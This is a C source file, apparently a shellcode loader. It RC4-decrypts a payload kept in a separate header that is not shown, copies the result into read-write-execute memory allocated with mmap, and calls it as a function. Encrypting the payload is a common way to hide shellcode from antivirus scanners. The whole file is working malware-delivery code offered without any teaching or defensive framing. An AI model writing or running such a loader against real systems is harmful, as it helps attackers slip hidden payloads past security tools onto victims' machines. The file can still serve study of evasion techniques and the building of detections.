#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include "encrypted_payload.h" // Contains the encrypted payload and key

void rc4_init(unsigned char *s, unsigned char *key, int key_length) {
    int i, j = 0;
    unsigned char temp;

    for (i = 0; i < 256; i++) {
        s[i] = i;
    }

    for (i = 0; i < 256; i++) {
        j = (j + s[i] + key[i % key_length]) % 256;
        temp = s[i];
        s[i] = s[j];
        s[j] = temp;
    }
}

void rc4_crypt(unsigned char *s, unsigned char *data, int data_length) {
    int i = 0, j = 0, k;
    unsigned char temp;

    for (k = 0; k < data_length; k++) {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;

        temp = s[i];
        s[i] = s[j];
        s[j] = temp;

        data[k] ^= s[(s[i] + s[j]) % 256];
    }
}

int main() {
    unsigned char s[256];
    size_t payload_size = sizeof(buf)-1; // Correctly calculate the size of buf

    // Verify the payload size
    printf("Payload size: %zu\n", payload_size);

    unsigned char decrypted_buf[payload_size];

    // Initialize RC4 state
    rc4_init(s, key, sizeof(key) - 1); // key from encrypted_payload.h

    // Copy encrypted payload to a temporary buffer
    memcpy(decrypted_buf, buf, payload_size);

    // Decrypt the payload
    rc4_crypt(s, decrypted_buf, payload_size);

    // Print the decrypted buffer contents
    printf("Decrypted buffer contents:\n");
    for (int i = 0; i < payload_size; i++) {
        printf("%02x ", decrypted_buf[i]);
        if ((i + 1) % 16 == 0) printf("\n");
    }
    printf("\n");

    // Allocate executable memory
    void *exec_mem = mmap(NULL, payload_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (exec_mem == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    // Copy decrypted payload to executable memory
    memcpy(exec_mem, decrypted_buf, payload_size);

    // Create a function pointer to the decrypted shellcode
    void (*shellcode)() = exec_mem;

    // Call the shellcode
    shellcode();

    // Clean up
    munmap(exec_mem, payload_size);

    return 0;
}
